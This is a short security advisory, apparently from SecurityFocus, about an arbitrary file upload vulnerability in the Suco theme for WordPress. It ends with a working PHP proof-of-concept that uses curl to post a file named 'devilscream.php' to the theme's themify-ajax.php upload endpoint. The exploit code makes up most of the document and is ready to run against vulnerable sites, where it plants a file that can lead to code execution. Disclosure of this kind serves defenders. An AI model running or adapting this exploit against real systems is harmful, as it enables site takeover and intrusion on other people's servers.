source: http://www.securityfocus.com/bid/63836/info

The Suco themes for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application. 

<?php
$uploadfile="devilscream.php";
$ch = curl_init("http://127.0.0.1/wp-content/themes/suco/themify/themify-ajax.php?upload=1");
curl_setopt($ch, CURLOPT_POST, true);  
curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?>